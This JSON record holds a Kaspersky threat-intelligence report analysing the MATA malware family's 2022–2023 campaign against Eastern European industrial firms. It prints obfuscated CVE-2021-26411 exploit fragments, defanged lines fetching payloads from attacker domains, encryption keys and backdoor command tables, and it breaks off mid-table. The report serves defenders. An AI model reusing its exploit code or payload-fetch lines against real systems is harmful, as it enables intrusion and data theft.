{
    "id": "f85d1826-b75d-48af-9539-e3d116dc4485",
    "created_at": "2023-10-19T02:05:52.475192Z",
    "updated_at": "2025-03-27T02:17:22.949586Z",
    "deleted_at": null,
    "sha1_hash": "0e6d101183f160adf079979e047c07b5d2b4e0e1",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-10-18T12:07:18Z",
    "file_modification_date": "2023-10-18T12:08:33Z",
    "file_size": 2008302,
    "plain_text": "# Updated MATA attacks industrial companies in Eastern Europe\n\n#### Kaspersky GReAT and ICS CERT\n\n\n-----\n\n## Contents\n\nExecutive Summary .................................................................................................................................................................................... 2\n\nAttack detection ......................................................................................................................................................................................... 3\n\nIn-lab analysis. Technical details – part 1 ...................................................................................................................................... 3\n\nInitial infection #1: Malicious documents .................................................................................................................................. 4\n\nInitial infection #2: Download link for executable ............................................................................................................... 6\n\nMATA “LLoader” (LLibrary) ............................................................................................................................................................... 7\n\nMATA Validator ......................................................................................................................................................................................... 7\n\nMataDoor (MATA generation 4) .................................................................................................................................................... 9\n\nLoader ............................................................................................................................................................................................................ 17\n\nMATA generation 3 ............................................................................................................................................................................... 17\n\nStealer .......................................................................................................................................................................................................... 25\n\nScreenshotter ......................................................................................................................................................................................... 25\n\nCredential Stealer ................................................................................................................................................................................. 25\n\nEDR/Security bypass tools ............................................................................................................................................................ 27\n\nCommand file tool ................................................................................................................................................................................ 29\n\nIncident investigation ............................................................................................................................................................................ 30\n\nTechnical details – part 2. In-the-field analysis results. .................................................................................................... 31\n\nLinux MATA generation 3 ................................................................................................................................................................ 32\n\nDiscovery .................................................................................................................................................................................................... 32\n\nLateral movement ................................................................................................................................................................................ 32\n\nAbusing security compliance solution .................................................................................................................................... 33\n\nAbusing the anti-malware solution ........................................................................................................................................... 35\n\nInteresting findings.................................................................................................................................................................................. 36\n\nSpreading using removable media ............................................................................................................................................. 37\n\nMATA generation 5 ............................................................................................................................................................................. 40\n\nVictims ............................................................................................................................................................................................................. 49\n\nMalicious infrastructure ....................................................................................................................................................................... 50\n\nAttribution .................................................................................................................................................................................................... 50\n\nSame XOR key ........................................................................................................................................................................................ 50\n\n1\n\n\n-----\n\nWorking path and naming scheme .............................................................................................................................................. 51\n\nKorean font in malicious documents ........................................................................................................................................ 52\n\nThreat actor's timezone ................................................................................................................................................................... 52\n\nAttribution hesitation ........................................................................................................................................................................ 53\n\nConclusions .................................................................................................................................................................................................. 54\n\nRecommendations ................................................................................................................................................................................... 54\n\nIndicators of Compromise .................................................................................................................................................................. 57\n\n## Executive Summary\n\nIn early September 2022 Kaspersky experts discovered several detections of malware from the\n[MATA cluster, previously attributed to the Lazarus group, compromising defense contractor](https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/)\ncompanies in Eastern Europe. This campaign remained active until May 2023. Expanding our\nresearch scope, we investigated and discovered additional, new, active actor campaigns with fullinfection chains, including an implant designed to work within air-gapped networks over USB sticks,\nas well as a Linux MATA backdoor.\n\nThe updated MATA malware was distributed via spear-phishing techniques to target victims,\ndeploying malware over multiple stages using validators. The actor also abused various security\nand anti-malware solutions the victims used, in the process of propagating within their\nenvironment. The new MATA generation 3 and generation 4 introduced several modifications to\nits encryption, configuration and communication protocols and one of them appears to have been\nrewritten from scratch. The new MATA generations incorporate new functionalities in terms of\ncircumventing network limitations, allowing the actor to build complex proxy chains within the\nvictims’ network as well as creating a 'stack' of various communication protocols to be used for C2\n(Command and Control) communications.\n\nDuring this research we also discovered a new MATA variant we dubbed MATA generation 5. This\nsophisticated malware, which has been completely rewritten from scratch, exhibits an advanced and\ncomplex architecture making use of loadable and embedded modules and plugins. MATA gen.5 is\ncapable of functioning as both a service and a DLL within different processes. The malware leverages\nInter-Process Communication (IPC) channels internally and employs a diverse range of commands,\nenabling it to establish proxy chains across various protocols - also within the victim's environment.\n\n[For more information please contact: ics-cert@kaspersky.com or intelreports@kaspersky.com](mailto:ics-cert@kaspersky.com)\n\n2\n\n\n-----\n\n## Attack detection\n\nIn September 2022, Kaspersky experts monitoring the telemetry of security solutions using\nKaspersky Security Network detected several dozen previously unknown malware samples\nassociated with the MATA cluster.\n\nWe [detailed](https://securelist.com/mata-multi-platform-targeted-malware-framework/97746/) this malware platform in 2020, and have documented its use in APT attacks on\nmultiple occasions over the past few years.\n\nIn particular, the malware samples that caught our attention contained strings indicating an\norganization that may have been the victim of the attack, which looked like an industrial entity in\nEastern Europe. We immediately contacted the organization that was likely to have been attacked\nto communicate the risk of compromise and share information about the detected threat and the\nIndicators of Compromise available at the time.\n\nAfter some time we received a call from an employee of that organization informing us that they\nhad detected connections to the domain controller using the account of one of the\nadministrators, which they considered \"suspicious\" – the administrator in question said that he did\nnot connect to the domain controller.\n\nSo we started investigating an incident in this organization's network that turned out to be just the\nbeginning of a bigger story.\n\n## In-lab analysis. Technical details – part 1\n\nMeanwhile, as we were collecting and analyzing the relevant telemetry data in the lab, we realized\nthe campaign had been launched in mid-August 2022. The attackers used spear-phishing\ntechniques to target several victims, while others were infected with Windows executable\nmalware by downloading files through an internet browser. The attackers continued to send\nmalicious documents via email until the end of September.\n\nAfter analyzing the timeline and functionality of each malware, we have determined the infection chain\nof this campaign. Although some parts remain unknown due to limited visibility, we have pieced\ntogether most of the infection chain. The attacker employed a combination of loader, main trojan, and\nstealer infection chains similar to those used by the previous MATA cluster and updated each\nmalware's capabilities. Moreover, they introduced a process to validate compromised victims to\nensure careful malware delivery.\n\nThe attackers also utilized a user-mode rootkit to elevate privileges and bypass endpoint security\nproducts. This added layer of complexity allowed them to operate undetected and achieve their\nobjectives more effectively.\n\n3\n\n\n-----\n\nFig. 1 Infection chain\n\n### Initial infection #1: Malicious documents\n\nFrom several victims, we observed the actor sending spear-phishing documents. Our investigation\nrevealed that in certain instances, the attackers were impersonating legitimate employees of the\ntargeted organizations, indicating that they had conducted extensive reconnaissance and\ngathered sensitive information prior to launching the attacks.\n\nThe contents of the lure documents were not related to the targeted businesses. The attackers\nobtained the text in the document from third-party sites available on the internet. The tactic had\nalready been used by Lazarus earlier in attacks on defense industry facilities in 2020.\n\nEach document contains an external link to fetch a remote page containing an exploit.\n\nFig. 2 External links\n\nAccording to our analysis, the fetched HTML page contains a [CVE-2021-26411](https://web.archive.org/web/20220822074658/https:/enki.co.kr/blog/2021/02/04/ie_0day.html) exploit which was\npreviously used by the Lazarus group in their campaign against security researchers. The exploit\ncode is similar to what Enki, a Korean security company, published before. This time, trivial\n\n4\n\n\n-----\n\nobfuscation was added and the code was modified to fetch the next stage payload (a Loader in\nthis case) rather than spawning shellcode in memory.\n\n**Exploit code analysis**\n\nPublished PoC code Exploit code in this case\n```\n var map = new Map() var map = new Map();\n var jscript9 = getBase(read(addrOf(map), var _j9_c0349d =\n 32)) getBase(read(_aO_bc03c(map), 32));\n var rpcrt4 = getDllBase(jscript9, var rpcrt4 = _gDB_f03ca(_j9_c0349d,\n 'rpcrt4.dll') 'rpcrt4.dll');\n var msvcrt = getDllBase(jscript9, var _mss = _gDB_f03ca(_j9_c0349d,\n 'msvcrt.dll') 'msvcrt.dll');\n var ntdll = getDllBase(msvcrt, 'ntdll.dll') var ntdll = _gDB_f03ca(_mss, 'ntdll.dll');\n var kernelbase = getDllBase(msvcrt, var _kb = _gDB_f03ca(_mss,\n 'kernelbase.dll') 'kernelbase.dll');\n var VirtualProtect = getProcAddr(kernelbase, var _kk32 = _gDB_f03ca(_j9_c0349d,\n 'VirtualProtect') 'kernel32.dll');\n var LoadLibraryExA = getProcAddr(kernelbase, var _vp_aa40fd = _gpA_03fc(_kb,\n 'LoadLibraryExA') 'VirtualProtect');\n var xyz = document.createAttribute('xyz') var _llda = _gpA_03fc(_kk32,\n                          'LoadLibraryA');\n var paoi = addrOf(xyz)\n                          var xyz = document.createAttribute('xyz');\n var patt = read(addrOf(xyz) + 0x18, 32)\n                          var paoi = _aO_bc03c(xyz);\n var osf_vft = aos()\n                          var patt = read(_aO_bc03c(xyz) + 0x18, 32);\n var msg = initRpc()\n                          var osf_vft = aos();\n var rpcFree = rpcFree()\n                          var msg = initRpc();\n killCfg(rpcrt4)\n                          var rpcFree = rpcFree();\n                          killCfg(rpcrt4);\n\n```\nWe observed several filenames and URLs used to fetch the next stage payload:\n```\n Example #1.\n var _dN_03fc = 'TCD702.dll'\n var _uL_0c42 =\n 'hxxps://tarzoose[.]com/chagent_sh?_sid=2a854c3df9098019daa886ae6f3ecaa0&_ts=60054a124ad9c\n 11d2f0afa8f60a3b26f&_agent=32'\n Example #2.\n var _dN_f04kcat = 'TCD702.dll'\n var _uL_dl049dsa =\n 'hxxps://tarzoose[.]com/chagent_sh?_sid=2a854c3df9098019daa886ae6f3ecaa0&_ts=085aeeb9e8e06\n 98da2f9ba9af0a9d7c9&_agent=64'\n\n```\n|Exploit code analysis|Col2|\n|---|---|\n|Published PoC code|Exploit code in this case|\n|var map = new Map() var jscript9 = getBase(read(addrOf(map), 32)) var rpcrt4 = getDllBase(jscript9, 'rpcrt4.dll') var msvcrt = getDllBase(jscript9, 'msvcrt.dll') var ntdll = getDllBase(msvcrt, 'ntdll.dll') var kernelbase = getDllBase(msvcrt, 'kernelbase.dll') var VirtualProtect = getProcAddr(kernelbase, 'VirtualProtect') var LoadLibraryExA = getProcAddr(kernelbase, 'LoadLibraryExA') var xyz = document.createAttribute('xyz') var paoi = addrOf(xyz) var patt = read(addrOf(xyz) + 0x18, 32) var osf_vft = aos() var msg = initRpc() var rpcFree = rpcFree() killCfg(rpcrt4)|var map = new Map(); var _j9_c0349d = getBase(read(_aO_bc03c(map), 32)); var rpcrt4 = _gDB_f03ca(_j9_c0349d, 'rpcrt4.dll'); var _mss = _gDB_f03ca(_j9_c0349d, 'msvcrt.dll'); var ntdll = _gDB_f03ca(_mss, 'ntdll.dll'); var _kb = _gDB_f03ca(_mss, 'kernelbase.dll'); var _kk32 = _gDB_f03ca(_j9_c0349d, 'kernel32.dll'); var _vp_aa40fd = _gpA_03fc(_kb, 'VirtualProtect'); var _llda = _gpA_03fc(_kk32, 'LoadLibraryA'); var xyz = document.createAttribute('xyz'); var paoi = _aO_bc03c(xyz); var patt = read(_aO_bc03c(xyz) + 0x18, 32); var osf_vft = aos(); var msg = initRpc(); var rpcFree = rpcFree(); killCfg(rpcrt4);|\n\n\n5\n\n\n-----\n\n```\n Example #3.\n var _dN_03fc = 'TCD702.dll'\n var _uL_0c42 =\n 'hxxps://beeztrend[.]com/addcart?_prdid=59f9e991161246da90e548e1b3c158385b9b797f2bc54f2873\n c813960638f2ff&_agent=32'\n Example #4.\n var _dN_03fc = 'KAP008.dll'\n var _uL_0c42 =\n 'hxxps://cakeduer[.]com/addcart?_prdid=59f9e991161246da90e548e1b3c158388be410ddb858336ff0a\n c4ea2538b08bb&_agent=32'\n\n### Initial infection #2: Download link for executable\n\n```\nOne of the victims was compromised by a Windows executable type Downloader. Notably, this\nmalware was fetched by a Chromium-based browser, which means the victim downloaded the\nmalware by clicking a malicious link. We suspect the actor sent a malicious link to the potential\nvictim via email or other messaging platform.\n\nThis malware has trivial functionality, fetching a payload from a remote server and executing it\nafter 0x30 1-byte XOR decryption.\n\n - Download URL: hxxps://zawajonly[.]com/assets/profile.png\n\n - Save path: %temp%\\systemupdate.dat\n\nAfter spawning the fetched payload, the malware pops-up a fake \"System Update Finished\"\nmessage. Based on the file name and message box, we assume the actor deceived the victim into\nbelieving that this program is related to a legitimate system update.\n\nFig. 3 Fake system update message\n\n\n6\n\n\n-----\n\n### MATA “LLoader” (LLibrary)\n\nSeveral victims were also infected with the Loader malware via the Internet Explorer exploit we\nmentioned before.\n\nImportant strings inside the malware are XORed with 1. The Loader has a 'load' export function with\nsimple functionality: fetching the next stage payload from the embedded URL and saving it to the\n```\nTCD701.dat file. The author named this malware as Loader(LLibrary).dll.\n\n```\n - Download URL:\n```\n    hxxps://tarzoose[.]com/fontsupdate?_sid=2a854c3df9098019daa886ae6f3ecaa0&-36i    &_ts=60054a124ad9c11d2f0afa8f60a3b26f&-36i-&_agent=32\n\n```\n - Saved path: %temp%\\TCD701.dat\n\nWe discovered several of these loaders. The actor maintains 32-bit and 64-bit versions of next\nstage payloads and seems to deliver a fitting version depending on the victim's host's architecture.\n\n - 32-bit download URL (MD5 91995c6813e20aad1a860d3e712787a6):\n```\n    hxxps://merudlement[.]com/fontsupdate?_sid=f4ac3aabb25e724cc5af9280d07dfd25&_ts=afbeff\n    c40cb8cec0639e6be9eba26c1e&_agent=32\n\n```\n - 64-bit download URL (MD5 a966668feca72d8dddf3c737d4908a29):\n```\n    hxxps://merudlement[.]com/fontsupdate?_sid=f4ac3aabb25e724cc5af9280d07dfd25&_ts=afbeff\n    c40cb8cec0639e6be9eba26c1e&_agent=64\n\n### MATA Validator\n\n```\nWe were able to acquire the payload fetched by the Loader malware.\n\n[This module has been written in C++ with STL; and libcurl](https://curl.se/) is statically linked inside. Upon launch, the\nmalware decrypts embedded strings. It includes the following C2 server addresses and recon\ncommands to profile the victim.\n\n - `hxxps://icimp.swarkul[.]com/wp-crond.php`\n\n - `hxxps://mbafleet[.]com/wp-crond.php`\n\n - `hxxps://prajeshpatel[.]com/wp-crond.php`\n\nIn this malware, there are nine whoami commands with various options executed at startup. Based\non the options, we can guess that the malware operator wants to get Active Directory information\nand privileges of the current user.\n\nCommand Description\n\n`whoami` Display user and group name\n\nDisplays the user name in user principal name (UPN) format. UPN is the name of a system\n```\n whoami /upn\n```\nuser in an email address format under the Active Directory environment.\n\n`whoami /fqdn` Displays the user name in fully qualified domain name (FQDN) format.\n\n7\n\n|Command|Description|\n|---|---|\n|whoami|Display user and group name|\n|whoami /upn|Displays the user name in user principal name (UPN) format. UPN is the name of a system user in an email address format under the Active Directory environment.|\n|whoami /fqdn|Displays the user name in fully qualified domain name (FQDN) format.|\n\n\n-----\n\n|Col1|i.e. CN=John,OU=Standard Users,OU=Resources,DC=COMPANY,DC=COM|\n|---|---|\n|whoami /logonid|Displays the logon ID of the current user. i.e. S-1-5-5-0-104531|\n|whoami /user|Displays the current domain and user name and the security identifier (SID).|\n|whoami /groups|Displays the user groups to which the current user belongs.|\n|whoami /claims|Displays claims for current user, including claim name, flags, type and values.|\n|whoami /priv|Displays the security privileges of the current user.|\n|whoami /all|Displays all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to.|\n\n\nThe results of these commands execution are cached and will be returned when C2 requests\nexecution of one of them via command #102. We also found an Easter Egg left by malware\nauthors: when a command containing “whoami” is received with parameters that are not included in\nthe table above, the hardcoded response is “KASPERSKY”.\n\nPeriodically the malware connects to the C2 server using libcurl, performs a handshake, sets up\nAES session keys and IVs, and receives commands.\n\nCommand Description\n\n`13` Terminates the malware execution\n\n`24` Set delay before next C2 server connection\n\nReturns to C2 server following information:\n\n        - randomly generated victim and session IDs\n\n        - hardcoded string “1.4.4” - probably the malware version\n\n`44`  - computer name\n\n        - user name\n\n        - OS name (“Windows”), checks if it “Server” edition\n\n        - “ver” Windows command line tool results\n\n`69` Download file from C2 server\n\n`77` Returns randomly generated session ID\n\n`96` Upload file to C2 server\n\nCheck “whoami” commands execution results cache from the table above or run the given\n```\n 102\n```\ncommand with “cmd.exe /C”. Send execution results to the C2 server.\n\n8\n\n|Command|Description|\n|---|---|\n|13|Terminates the malware execution|\n|24|Set delay before next C2 server connection|\n|44|Returns to C2 server following information: ● randomly generated victim and session IDs ● hardcoded string “1.4.4” - probably the malware version ● computer name ● user name ● OS name (“Windows”), checks if it “Server” edition ● “ver” Windows command line tool results|\n|69|Download file from C2 server|\n|77|Returns randomly generated session ID|\n|96|Upload file to C2 server|\n|102|Check “whoami” commands execution results cache from the table above or run the given command with “cmd.exe /C”. Send execution results to the C2 server.|\n\n\n-----\n\n|222|Run the process with a given command line.|\n|---|---|\n\n\nThere is a set of embedded, but not used, strings that lead us to suppose this malware might exist\nfor the following operating systems / platforms:\n\n - MacOS\n\n - iPhone\n\n - Linux\n\n - BSD\n\n - “Other Apple OS”\n\n - “Other Unix OS”\n\n### MataDoor (MATA generation 4)\n\nAccording to our telemetry, the Validator malware fetched a different type of malware we called\nMataDoor.\n\nIn a recent [publication by Positive Technologies, the third generation of MATA was analyzed and it](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/dark-river-you-can-t-see-them-but-they-re-there/)\nwas named ‘MataDoor’. Probably, this collision occurred because Kaspersky Lab products have\nbeen detecting samples of the MATA family of both the third and fourth generations as MataDoor\nsince autumn 2022. However, when we say ‘MataDoor’, we mean MATA generation 4.\n\nAll the MataDoor samples we discovered were Windows executables and disguised as legitimate\nprograms such as a security solution agent, VPN client, Adobe programs and such. Also, almost all\n[of them were packed by the Themida protector. After analyzing MataDoor, we concluded it's a](https://themida.com/Themida.php)\nrewritten from scratch variant of the known MATA. This malware has comprehensive capabilities\nto control the victim similar to the older MATA.\n\nUpon launch, the malware starts a service named 'wuausrv'. This malware contains embedded\nencrypted default configuration settings and decrypts it with 0x26 1-byte XOR. And it can\nsave/restore its configuration settings from the configuration file at %TEMP%\\ocrcrypto.bak, which\nis XOR 0x55 encrypted. The configuration data contains a few C2 addresses, pre-defined or\nrandomly generated victim ID, C2 connection interval, and C2 communication method: active,\npassive for multiple, passive mode for only one incoming connection.\n\n9\n\n\n-----\n\nFig. 4 Decrypted configuration\n\nThis malware leverages the open source library 'OpenSSL 1.1.1k' for covert network\ncommunication. It supports four protocol types: SSL, DTLS, TCP, UDP. HTTP and HTTPS modes\nare recognized in the C2 configuration string but not implemented.\n\nDepending on the configuration, it can work as a passive mode server that opens a port, awaiting\nincoming requests, or actively connects to the given C2 server. Using the different backdoor’s\noptions, the attackers were able to deploy proxy C2 servers inside a victim's network to route\ntraffic over different machines to a node, which has an Internet connection, and back.\n\nIn TCP client mode, the malware may use four proxy types to connect to the C2 server: SOCKS4,\nSOCKS5 and HTTP with Basic and NTLM authorization. The fifth option is a strange proxy type\ncalled ‘ssh’, which, although recognized in the configuration, is not implemented.\n\n**MataDoor plugins**\n\nThere are seven plugins embedded into the malware. Depending on the response from the C2\nserver, the malware calls the plugins to execute commands. These are addressed by a paired ID:\npluginID/commandID.\n\nEmbedded and downloaded plugins have following functions:\n\n - “module_entry” - search command handler function by command ID\n\n - “module_isbusy” - checks if plugin unloading is allowed\n\n - “module_monitorevent” - calling to this function is initiated by command 16 of plugin #0 (for\n\nall plugins that have non-null “module_monitorevent”)\n\nThe malware answers the C2 server with messages that have a similar structure to the command,\nwhere pluginID is 127 and the commands are as follows:\n\n10\n\n\n-----\n\n|Message|Description|\n|---|---|\n|0|Command was successfully executed|\n|1|Command execution error|\n|2|Acknowledge command has been received. This message is sent to C2 server just before command handler execution|\n|3|Acknowledge command has been received, but requested pluginID hasn't found|\n|4|Acknowledge command has been received, but requested command handler has not found|\n|0x200|The first ‘Hello’ message is sent to C2 server in active connection mode|\n|0x202|This message is sent to C2 server when proxy or proxy-chain connection is established and C2 server is now connected to the requested target, the malware is switched to traffic forwarding state|\n\n\nPlugin#0 “Orchestrator” commands are as follows:\n\n|Command|Description|\n|---|---|\n|0|Returns victim ID, configuration settings, collected “MonitorEvent” information (see below) and various system information such as ● Windows version ● Processor architecture ● Computer name ● User name ● User profile path ● Network adapters IP and MAC addresses|\n|1|Returns configuration storage file name (%TEMP%\\ocrcrypto.bak)|\n|2|Returns configuration settings|\n|3|Set new configuration settings|\n|4|Save configuration settings in file %TEMP%\\ocrcrypto.bak|\n|5|Deletes configuration file %TEMP%\\ocrcrypto.bak|\n|6|Returns the currently configured C2 servers list|\n|7|Set new list of C2 servers|\n\n\n11\n\n\n-----\n\n|8|Returns list of currently loaded plugins|\n|---|---|\n|9|Download and run a new plugin Where plugin is a DLL with mandatory exports named: “module_entry” and “module_isbusy”. The plugin may also have an optional export “module_monitorevent”|\n|10|Unload plugin|\n|11|Add this victim to a proxy chain. This command argument is a list of URLs of other victims running in passive mode and the index of the next node should be connected in the chain. The malware connects to the next node and sends the same command to it with an incremented next node index. Then forwards all traffic between the next and previous nodes. When the index reaches out the list, this node is a chain target and a success message is returned to the chain initiator. Maximum chain length is 12 nodes.|\n|12|Ping. This command does nothing, just returns a success answer.|\n|13|Returns the current directory|\n|14|Set the current directory|\n|15|Loads library|\n|16|Call “module_monitorevent” function for all loaded and embedded plugins|\n|17|Hibernate. Put the malware into an inactive state for a long time up to 30 days. The time when malware should be awakened is saved in file %TEMP%\\ocrcrypto.bak.slp|\n|18|Exit the malware process|\n|19|Force system reboot with the reason “Operating System: Upgrade (Planned)”|\n|20|Fork the malware process|\n|21|Add this victim to a proxy chain. This command is similar to command 11 and makes a chain of victims forwarding traffic between chain nodes. The difference is the penult node of the chain connects to an arbitrary TCP or UDP service inside victim’s local network.|\n\n\nPlugin#1 “Processes” commands are as follows:\n\n|Command|Description|\n|---|---|\n|0|Run process with redirected stdout and stderr streams. Send results to the C2 server.|\n|1|Run process|\n\n\n12\n\n\n-----\n\n|2|Run process as user|\n|---|---|\n|3|Returns following details about all currently running processes: ● PID, parent PID ● command line ● timing information ● process owner|\n|4|Kill process|\n|5|Returns the malware and parent process IDs|\n|6|Checks if the process with specified ID is alive|\n|7|Run process|\n|8|Run process as user|\n\n\nPlugin#2 “Files” commands are as follows:\n\n|Command|Description|\n|---|---|\n|0|Download part of file from C2 server|\n|1|Upload part of file to C2 server|\n|2|Pack files to zip archive and upload it to C2 server|\n|3|Securely wipe file|\n|4|Does nothing|\n|5|Copies creation, last access and last write timestamps of one file to another|\n|6|Returns the list of files in specified folder or list of logical drive types|\n|7|Write to file detailed list of files in specified folder|\n|8|Pack files to zip archive|\n|9|Returns the list of files in specified folder or list of logical drive types|\n|10|Copy file|\n|11|Copy large file in dedicated thread|\n|12|Delete file|\n\n\n13\n\n\n-----\n\n|13|Concatenate two files into third|\n|---|---|\n|14|Split large file to smaller parts|\n|15|Rename file|\n|16|Move large file using dedicated thread|\n|17|Append string to file|\n|18|Upload file to C2 server|\n|19|Upload tail of file (last 32KB) to C2 server|\n|20|Returns total size of all files in the directory|\n|21|Calculate size of directory in dedicated thread and save results into the file|\n|22|Copy directory|\n|23|Copy directory using dedicated thread|\n\n\nPlugin#3 “NetRecon” commands are as follows:\n\n|Command|Description|\n|---|---|\n|0|Netstat. Returns list of TCP/UDP listeners and established connections endpoints together with owner process ID|\n|1|Ifconfig. Returns network interfaces configuration|\n|2|Probe TCP connection to specified IP-address:port|\n|3|Probe TCP connections to IP-subnet:port, save results to file|\n|4|Probe TCP connections to IP:ports-range, save results to file|\n|5|ICMP ping specified host|\n|6|ICMP ping all hosts in subnet, save results to file|\n|7|Probe TCP connection to specified host:port and then receive probed server greeting message|\n|8|Probe TCP connection and then receive probed servers greeting message for all hosts in specified subnet, save results to file|\n|9|Probe TCP connection to specified host:ports-range and then receive probed server greeting message, save results to file|\n|10|Connect to remote Windows shared resource (disk or printer) with specified credentials|\n\n\n14\n\n\n-----\n\n|11|Disconnect shared resource|\n|---|---|\n|12|Checks if local WMI query is available|\n|13|Set new value of an arbitrary WMI data performing local WMI query|\n|14|Perform remote WMI query with specified credentials to get an arbitrary WMI data|\n|15|Perform remote WMI query with specified credentials to set new value of an arbitrary WMI data|\n|16|Query victim’ DNS server for “A” or “PTR” record|\n\n\nPlugin#4 “Proxy” commands are as follows:\n\n|Command|Description|\n|---|---|\n|0|Active-active proxy. The malware TCP connects to two remote hosts (optionally using an external proxy server) and then forwards traffic between them.|\n|1|Active-active C2 proxy. The malware TCP connects to an arbitrary host and TCP/UDP/SSL/DTLS connects to another C2 server (optionally using a 3rd party proxy server) and then forwards traffic between them.|\n|2|Passive-active proxy. The malware waits for incoming TCP connection on one side and TCP connects to an arbitrary host on another side and then forwards traffic between them.|\n|3|Implements HTTP proxy server. Agent string returned to client is: “Proxy-agent: amazon-http”|\n|4|Implements SOCKS4 proxy server|\n|5|Implements simplified SOCKS5 proxy server|\n|6|Implements remote shell server (shell command line may be specified or used “cmd.exe” by default)|\n|7|Initiate proxy chain. The malware connects to another C2 server on one side and another victim on another side (optionally using an 3rd party proxy server in both cases), then sends command 21 of plugin #0 to another victim to initiate the proxy chain. Then forwards traffic between them.|\n|8|Connects to another C2 server and then acts like a SOCKS4 proxy server receiving incoming connection from another C2.|\n|9|Connects to another C2 server and then acts like a simplified SOCKS5 proxy server receiving incoming connection from another C2.|\n|10|Connects to another C2 server and then acts like HTTP proxy server received incoming connection from another C2.|\n\n\n15\n\n\n-----\n\n|11|Connects to another C2 server and then acts like remote shell server described in command 6 of this plugin|\n|---|---|\n\n|Plugin#5 “Inject”|commands are as follows:|\n|---|---|\n|Command|Description|\n|0|Inject LoadLibrary call into process specified by ID|\n|1|Inject LoadLibrary call into process specified by name|\n|2|Inject reflective loader into process specified by ID that loads DLL from file|\n|3|Inject reflective loader into process specified by name that loads DLL from file|\n|4|Inject reflective loader into process specified by ID that unloads DLL, which was previously loaded with command 2 or 3|\n|5|Inject reflective loader into process specified by name that unloads DLL, which was previously loaded with command 2 or 3|\n|6|Inject reflective loader into process specified by ID that loads DLL from XORed file and then call specified export function of this DLL|\n|7|Inject reflective loader into process specified by name that loads DLL from XORed file and then call specified export function of this DLL|\n|8|Same as command 6. Probably a bug, intentioned corresponding DLL unload command|\n|9|Same as command 7. Probably a bug, intentioned corresponding DLL unload command|\n\n\nPlugin 6 is the only embedded plugin that has a “module_monitorevent” function implemented. This\nfunction has the following capabilities:\n\n - Checks if number of active user sessions is grown\n\n - Checks if removable drive was inserted/removed\n\n - Checks if file from monitored list is appeared\n\n - Checks if size of file from monitored list is changed\n\n - Checks if process from monitored process list exists\n\n - Checks if TCP connection with endpoints (specified by local/remote IP addresses and\nports) from monitored network connections list is established\n\nPlugin#6 “Monitoring” commands are as follows:\n\n16\n\n\n-----\n\n`7` Setup list of monitored network connections\n\n### Loader\n\nFrom one victim, we discovered a Loader malware exhibiting several similarities with past MATA\nmalware. In the MATA cluster, the actor used two types of loaders: directly loading a DLL file, or\nloading an encrypted payload after decrypting it. The developer calls them differently in its internal\nname:\n\n - loader_service_raw_win_intel_64_le_RELEASE.dll: Load DLL file directly\n\n - loader_service_win_intel_64_le_RELEASE.dll: Load DLL file after decrypting\n\nMost of the loaders are protected by the Themida protector to hinder detection and analysis. It\nseems to be registered and executed by a Windows service based on its export function name:\nServiceMain. The Loader that loads the intact DLL file acquires the DLL file path via AES\ndecryption and simply loads it. The other type of Loader acquires a target file path with the same\nmethod. However, the target file is in encrypted format loading it after XOR or AES decryption.\nThe payload loaded by both of the Loaders is the MATA malware we describe in the next section.\n\n### MATA generation 3\n\nWe detected further MATA backdoors spawned by the Loader malware present in memory. The\ninternal name of this malware is 'MATA_DLL_DLL_PACK_20220829_009_win_intel_64_le_RELEASE.dll'.\n\nAll external libraries and API names are encrypted and retrieved with an embedded 64-byte XOR\nkey. We saw an identical decryption method in a previous investigation, involving what we now\nconsider MATA generation 2:\n\n17\n\n|Command|Description|\n|---|---|\n|0|Returns MonitorEvent configuration|\n|1|Setup MonitorEvent configuration|\n|2|Returns list of monitored processes|\n|3|Setup list of monitored processes|\n|4|Returns list of monitored files|\n|5|Setup list of monitored files|\n|6|Returns list of monitored network connections|\n|7|Setup list of monitored network connections|\n\n\n-----\n\n - XOR key: 33 53 8B D0 9B C4 B1 B7 FD DD 1F F8 DA C1 EB C5 F3 E7 F4 BE FB E2 F9 4E F1 DD\nBC BE DB 7D FA E2 E9 FE F3 FD A7 CF F7 76 BF DB D9 DD 7D 8A 9F C4 F3 3F 92 29 F3 4A\nE3 C4 8E 84 C0 BB 8C BE 3E EE\n\nThis MATA 3 contains encrypted configuration and decrypts it with AES-CBC mode.\n\n - AES key: 29 23 BE 84 E1 6C D6 AE 52 90 49 F1 F1 BB E9 EB\n\n - AES IV: B3 A6 DB 3C 87 0C 3E 99 24 5E 0D 1C 06 B7 47 DE\n\nInterestingly, the key and IV are not randomly generated and can be found on the internet in\nvarious contexts.\n\nThe decrypted configuration contains C2 addressees, registry path and so on in the TTLV (typetag-length-value) encoding form previously seen in Lamberts' and Equation malware.\n\nWhile this malware embeds default configuration data, it may also store modified configuration in\na registry path defined in the embedded configuration,\n'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\DataUSvc' in this case.\n\nFig. 5 Decrypted configuration\n\nThe functionalities of this malware are very similar to the previously described MataDoor malware.\nIt also has modular architecture despite being built as a monolith DLL or EXE.\n\n18\n\n\n-----\n\nWe found a protocol plugin embedded, allowing for more protocols to be installed. These\nprotocols are stacked one on top of another in an order specified via a configuration string of the\nC2. The following protocols are supported by the embedded protocol plugin:\n\nID Description\n\n“raw” - The Raw protocol entity is implemented as an object like C++ base class the other\nprotocols are inherited from.\n\nAll protocols have the following set of methods (most important are listed):\n\n         - ActiveConnect\n\n`1000`  - PassiveListen\n\n         - PassiveAccept\n\n         - Send\n\n         - Recv\n\nAll methods of “raw” protocol just forward call to underlying protocol in stack\n\n“tcp” and “tcp6” - implements unencrypted active and passive connections on base of TCP\n```\n 1001\n```\nversion 4 and 6\n\n“http” - implements active and passive connections by adding HTTP 1.1 headers to transferred data\n\n“https” - stacks “ssl” protocol above “http”\n```\n 1002\n\n```\n“proxy_http” - stacks “raw” protocol above given\n\n“proxy_https” - implements HTTP proxy connection with Basic and NTLM authentication\n\n“proxy_socks4” and “proxy_socks4a” - implements ActiveConnect method to establish\n```\n 1003\n```\nconnection via SOCKS proxy version 4 and 4a\n\n“ssl” and “ssl3” - implements TLS ver 1.2 and ver 1.3 encrypted active and passive connections with\n```\n 1004\n```\nhelp of statically linked [wolfSSL library](https://www.wolfssl.com/)\n\n“udp” and “udp6” - implements unencrypted active and passive connections on the base of UDP\n\n`1005` version 4 and 6. The dedicated thread cares about connection establishment and termination,\n\nmissed packets resending and packets 